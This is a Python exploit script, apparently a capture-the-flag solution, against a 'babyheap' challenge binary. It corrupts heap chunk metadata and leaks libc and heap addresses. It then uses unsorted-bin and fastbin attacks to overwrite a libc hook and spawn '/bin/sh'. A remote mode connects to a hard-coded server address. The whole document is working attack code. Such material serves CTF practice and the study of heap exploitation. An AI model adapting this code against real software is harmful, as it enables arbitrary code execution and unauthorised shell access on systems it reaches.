#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './babyheap_69a42acd160ab67a68047ca3f9c390b9'
context.arch = 'amd64'
context.log_level= 'INFO'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir
# os.environ['LD_PRELOAD'] = './nosleep.so'

elf = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')

def exploit():
    if mode == 'debug':
        io = debug(binary)
        io.b([
            0x0000555555554000 + 0x0000000000000CB6,
            0x0000555555554000 + 0x0000000000000C90,
        ])
        io.r()
        io.clean()
        io.sendline('i r rax')
        array_addr = int(io.recvregex('rax\s+0x([0-9a-f]+)\s', group=1), 16)
        io.c()
        io.sendline('i r rax')
        array_addr += int(io.recvregex('rax\s+0x([0-9a-f]+)\s', group=1), 16)
        log.info('struct array address: %#x', array_addr)
        io.c()
    elif mode == 'remote':
        io = remote('202.120.7.218', 2017)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def do_allocate(size):
        io.sendlineafter('Command:', 1)
        io.sendline(size)
        io.recvuntil('Index')
        return int(io.recvline().strip())

    def do_fill(idx, content):
        io.sendlineafter('Command:', 2)
        io.sendline(idx)
        io.sendline(len(content))
        io.sendafter('Content:', content)

    def do_free(idx):
        io.sendlineafter('Command:', 3)
        io.sendline(idx)

    def do_dump(idx):
        io.sendlineafter('Command:', 4)
        io.sendline(idx)
        io.recvline_contains('Content:')

    do_allocate(1) # idx 0
    do_allocate(0x90) # idx 1
    do_allocate(0x90) # idx 2
    do_free(1)

    do_fill(0, cyclic(0x18) + p64(0xd1))
    do_allocate(0xb0)
    do_fill(1, cyclic(0x98) + p64(0xa1))

    do_allocate(1) # idx 3
    do_allocate(0x90) # idx 4
    do_allocate(1) # idx 5
    do_free(2)
    do_free(4)

    do_dump(1)
    io.recvn(0xa0)
    a_libc_ptr = u64(io.recvn(8))
    a_heap_ptr = u64(io.recvn(8))
    libc_base_addr = a_libc_ptr - 0x3a5678
    heap_base_addr = a_heap_ptr - 0x180
    log.info('libc base address: %#x', libc_base_addr)
    log.info('heap address: %#x', heap_base_addr)

    do_allocate(0x60) # idx 2
    do_allocate(0x60) # idx 4

    do_allocate(400) # 6
    do_allocate(400) # 7
    do_free(6)
    do_fill(5, cyclic(24) + p64(0x1a1) + p64(0) + p64(libc_base_addr + 0x3A77C8 - 0x18 - 5))
    do_allocate(400)

    do_free(4)
    do_free(2)
    do_fill(1, cyclic(0x98) + p64(0x71) + p64(libc_base_addr + 0x3A77C8 - 0x10))
    do_allocate(0x60) # idx 2
    do_allocate(0x60) # idx 4

    do_fill(4, p64(libc_base_addr + 0x40FB0))
    do_fill(0, '/bin/sh\x00')
    do_free(0)
    io.clean()

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''#
        x/20xg {0:#x}
        # x/60xg *(long long*)({0:#x} + 0x10) - 0x10
        # x/20xg *(long long*)({0:#x} + 0x40) - 0x10
        # x/20xg
        x/60xg 0x555555757000
        x/4xg 0x00007ffff7bd4ac8
        x/8xg 0x7ffff7bd77c8 - 0x20
        x/4xg 0x00005555557570c0
        '''.format(array_addr).strip().split('\n'))

    io.interactive()

if __name__ == '__main__':
    exploit()
